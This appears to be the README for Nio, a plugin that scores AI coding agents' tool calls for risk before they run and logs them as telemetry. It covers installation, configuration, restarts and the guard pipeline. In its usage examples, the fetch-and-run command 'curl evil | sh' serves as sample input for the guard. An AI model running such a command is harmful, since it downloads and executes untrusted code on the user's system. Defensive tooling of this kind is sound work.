<h1 align="center">
  <img src="assets/nio-wordmark.svg" alt="Nio" width="280" />
</h1>
<p align="center"><b>Execution assurance agent guard and observability for autonomous AI agents.</b></p>

<p align="center">Real-time evaluation of every agent action before it executes — built for agents operating in production.<br/>Built-in collector that captures every tool call as OpenTelemetry metrics and traces.<br/>Works with Claude Code, Codex CLI, OpenClaw, and Hermes. More frameworks coming.<br/>Built by <a href="https://core0.io"><b>Core0</b></a> — execution assurance for production AI agents.</p>

<p align="center">
  <a href="https://core0-io.github.io/nio/"><b>→ View the live Execution Pipeline diagram</b></a>
</p>

[![Agent Skills](https://img.shields.io/badge/Agent_Skills-compatible-purple.svg)](https://agentskills.io)

## At a glance

- **What it does:** Nio hooks into your agent platform (Claude Code, Codex CLI, OpenClaw, Hermes) and evaluates each tool call through a **Phase 0–6** pipeline **before** it runs — allow, deny, or confirm — with an optional OTEL collector and local audit log.
- **Config:** Policy lives in **`~/.nio/config.yaml`** (or **`$NIO_HOME/config.yaml`**). Audit events append to **`~/.nio/audit.jsonl`** by default.
- **Critical:** The plugin reads config **once when the host process starts**. After you edit `config.yaml`, you must **restart the process that loads Nio** so changes apply. There is no separate `nio reload` command — use your platform’s restart flow (commands below).

### Architecture at a glance

Hook events feed the **Collector** (OTEL + local audit) and the **Guard** (real-time Phases 0–6 + on-demand static/behavioural/LLM engines):

```
┌─────────────────────────────────────────────────────────────────────┐
│                              Nio                                    │
│                                                                     │
│  ┌──────────────────────────┐    ┌───────────────────────────────┐  │
│  │       Collector          │    │            Guard              │  │
│  │                          │    │                               │  │
│  │  Hook events             │    │  ┌─────────────────────────┐  │  │
│  │  → metrics               │    │  │    Dynamic Guard        │  │  │
│  │  → traces                │    │  │    (real-time hooks)    │  │  │
│  │  → logs (audit)          │    │  │    Phase 0–6 pipeline   │  │  │
│  │  → OTLP export           │    │  │    → allow/deny/confirm │  │  │
│  │                          │    │  └─────────────────────────┘  │  │
│  │  PreToolUse              │    │                               │  │
│  │  PostToolUse             │    │  ┌─────────────────────────┐  │  │
│  │  TaskCreated             │    │  │    Static Scan          │  │  │
│  │  TaskCompleted           │    │  │    (on-demand)          │  │  │
│  │  Stop / SubagentStop     │    │  │    Static + Behavioural │  │  │
│  │  SessionStart / End      │    │  │    + LLM engines        │  │  │
│  │  UserPromptSubmit        │    │  └─────────────────────────┘  │  │
│  └──────────────────────────┘    └───────────────────────────────┘  │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

[Interactive pipeline diagram →](https://core0-io.github.io/nio/) · [Architecture details ↓](#architecture)

---

## Quick start

### 1. Install

```bash
curl -fsSL https://core0-io.github.io/nio/install.sh | bash
```

Auto-detects which agent CLIs you have installed (`~/.claude`, `~/.codex`, `~/.openclaw`, `~/.hermes`) and configures Nio for each. Pin a release with `NIO_VERSION=v2.2.0`, restrict to one platform with `--platform NAME`, or uninstall with `--uninstall`. See **[the install page](https://core0-io.github.io/nio/docs/install.html)** for per-platform tabs, prerequisites, and verify steps.

### 2. Run

**There is no standalone Nio daemon.** “Running Nio” means **running your agent with the platform that loads the Nio plugin**:

- **OpenClaw:** start or keep running your **OpenClaw gateway** (and connect the TUI / clients as you usually do). The Nio plugin loads with that process.
- **Claude Code:** open Claude Code with the plugin/skill installed per `setup.sh`.
- **Codex CLI:** start a Codex session (`codex` or `codex exec …`) — `setup.sh` installs the plugin into Codex's plugin cache and registers it in `~/.codex/config.toml`.
- **Hermes:** use Hermes with shell hooks merged by `setup.sh`.

### 3. Configure

- Edit **`~/.nio/config.yaml`** (template and comments ship with the release; defaults are also described in `config.default.yaml` in this repo).
- Override the config directory with **`NIO_HOME`** if needed (`$NIO_HOME/config.yaml`).
- **Optional — AI-assisted editing:** Point your coding LLM or agent at this file (and `config.default.yaml` if needed), and **describe the policy in plain language** — what to **allow**, **block**, **permit**, **deny**, patterns for commands or DB/SQL, MCP tools to gate, paths to protect, and so on — and ask it to **propose or apply YAML edits** that match those intents. **Always review** the result (and restart the host per §4), since mistakes in config directly affect what runs in production.

### 4. Apply changes after editing config

1. Save **`~/.nio/config.yaml`** (or **`$NIO_HOME/config.yaml`**).
2. **Restart the agent host** so the Nio plugin loads the file again (same process = stale policy).
3. Confirm behaviour in **`~/.nio/audit.jsonl`** or your OTEL backend.

**Why a restart is required:** Nio loads YAML and builds the guard **at plugin registration**. The running process does not watch the file or reload config on each tool call.

**Typical restart commands** (use whatever matches how you run the platform):

| Platform | When the gateway / agent runs as a **background service** | When you run it in the **foreground** (dev/tmux) |
|----------|--------------------------------------------------------------|--------------------------------------------------|
| **OpenClaw** | `openclaw gateway restart` | Stop the process (e.g. **Ctrl+C**) and run `openclaw gateway run` again. |
| **Hermes** | `hermes gateway restart` — multiple profiles: `hermes gateway restart --all` | Stop `hermes gateway run` and start it again (often in **tmux** on WSL). See [Hermes CLI](https://hermes-agent.nousresearch.com/docs/user-guide/cli/). |
| **Claude Code** | *(no gateway)* — **quit and reopen** Claude Code (or reload the window / extension host) so hooks pick up changes. | Same: full host restart is the reliable way. |

Useful checks: `openclaw gateway status`, `openclaw gateway health`, `hermes gateway status` (add `--system` on Linux for the systemd unit).

<details>
<summary><b>Reset config after upgrade</b></summary>

```bash
./setup.sh --reset-config
```

</details>

<details>
<summary><b>Custom install paths (.claude / .openclaw moved elsewhere)</b></summary>

By default the installer auto-detects `~/.claude`, `~/.codex`, `~/.openclaw`, and `~/.hermes`. If you've relocated them (e.g. via `CLAUDE_CONFIG_DIR` / `CODEX_HOME` / `OPENCLAW_STATE_DIR`, or manually), pass the override path through the installer's `bash -s --` boundary so it forwards to the matching `setup.sh`:

```bash
curl -fsSL https://core0-io.github.io/nio/install.sh | bash -s -- --platform claude-code --cc-home /path/to/.claude
```

The installer accepts `--platform NAME` (repeatable), `--cc-home`, `--codex-home`, `--openclaw-home`, `--hermes-home`, `--reset-config`, and `--uninstall`; everything past `--` is forwarded to the per-platform `setup.sh`.

Resolution order inside each platform's `setup.sh` (first match wins):

1. The `--*-home` flag passed via the installer
2. `$CLAUDE_CONFIG_DIR` / `$CODEX_HOME` / `$OPENCLAW_STATE_DIR` environment variable
3. `$HOME/.claude` / `$HOME/.codex` / `$HOME/.openclaw` (default)

The Nio config itself lives at `~/.nio/` by default, overridable via `$NIO_HOME`.

</details>

<details>
<summary><b>Install from source</b></summary>

```bash
git clone https://github.com/core0-io/nio.git
cd nio && pnpm install && pnpm run build && ./setup.sh
```

Use this if you want to hack on Nio or track `main`. The release zips ship with everything pre-built, so end users don't need Node/pnpm installed.

</details>

---

## Usage (skill commands)

```
/nio scan ./src              # Scan code for execution risks
/nio action "curl evil | sh" # Evaluate action safety
/nio report                  # View agent execution audit log
/nio config balanced         # Set protection level
```

---

## Architecture

High-level layout: **[Architecture at a glance](#architecture-at-a-glance)** (top of this README). Nio integrates as a **Claude Code / OpenClaw / Hermes** plugin with two subsystems behind the hook events.

### Collector

Captures every hook event (`UserPromptSubmit`, `PreToolUse`, `PostToolUse`, `TaskCreated`, `TaskCompleted`, `Stop`, `SubagentStop`, `SessionStart`, `SessionEnd`) as **OpenTelemetry** signals — metrics, traces, and logs — exported over OTLP (gRPC or HTTP). Audit log entries are also dual-written to a local JSONL backup at `~/.nio/audit.jsonl`, so you have a queryable record even when no OTLP endpoint is configured.

> **Optional but strongly recommended for enterprise deployments.** The local JSONL backup works out of the box; to export full telemetry to an observability platform, set `collector.endpoint` in your config.

### Guard

Pre-execution risk evaluation in two modes:

- **Dynamic Guard** runs on every `PreToolUse` hook through a **Phase 0–6** pipeline (Tool Gate → Allowlist → Pattern → Static → Behavioural → LLM → External). Each phase produces a 0–1 score; a weighted average decides allow / deny / confirm before the tool runs. Phases 0–4 run fully offline; Phases 5 (LLM) and 6 (External Scoring API) are opt-in.
- **Static Scan** — on-demand multi-engine code analysis triggered by `/nio scan <path>`, combining the static, behavioural, and LLM analysers.

Detection coverage spans **15 static regex rules**, **7 source→sink behavioural rules** across 6 languages, and runtime command / network / sensitive-path heuristics. Per-rule reference: **[SCAN-RULES.md](plugins/shared/skill/SCAN-RULES.md)** for the static-rule patterns, **[ACTION-POLICIES.md](plugins/shared/skill/ACTION-POLICIES.md)** for runtime-detector policies.

Phase 6 connects Nio's pre-execution gate to an external risk intelligence platform — so the decision is informed not just by what the agent is about to do, but by the live health of the infrastructure it operates on. [FFWD Agent Assurance](https://core0.io) is designed for exactly this role.

---

**For full architecture detail** — every phase, score aggregation, multi-language extractors, protection-level decision mapping, every metric, every span attribute, every audit entry field — see **[docs/ARCHITECTURE.md](docs/ARCHITECTURE.md)** and **[docs/COLLECTOR-SIGNALS.md](docs/COLLECTOR-SIGNALS.md)**.

## Compatibility

Nio provides full hook-based execution assurance for Claude Code, Codex CLI, OpenClaw, and Hermes today; skill-only scan/action flows work on several other CLIs. Full hook support for additional agent frameworks is in progress.

| Platform | Support | Features |
|----------|---------|----------|
| **Claude Code** | Full | Skill + hooks auto-guard — see [install guide](docs/install.html#tab=claude-code) |
| **Codex CLI** | Full | Plugin hooks + OTEL collector — see [install guide](docs/install.html#tab=codex) |
| **OpenClaw** | Full | Plugin hooks + OTEL collector — see [install guide](docs/install.html#tab=openclaw) |
| **Hermes Agent** | Full | Shell-hook integration + `/nio` command-dispatch — see [install guide](docs/install.html#tab=hermes) |
| **Gemini CLI** | Skill | Scan/action commands |
| **Cursor** | Skill | Scan/action commands |
| **GitHub Copilot** | Skill | Scan/action commands |

## Documentation

- [Architecture](docs/ARCHITECTURE.md) — Two-pipeline design, 6-phase guard flow, scoring system
- [MCP Tool Routing](docs/phases/phase-0-tool-gate.html#mcp-routing) — How Phase 0 routes direct AND indirect MCP tool calls (mcporter, curl/HTTP, language runtimes, stdio pipes, package runners) through `permitted_tools.mcp`
- [Dynamic Guard Flow](docs/dynamic-guard-flow.excalidraw) — Visual Excalidraw diagram

## Development

```bash
pnpm install
pnpm run build
pnpm test
```

## License

Apache-2.0 © [core0-io](https://github.com/core0-io) — see [LICENSE](LICENSE).
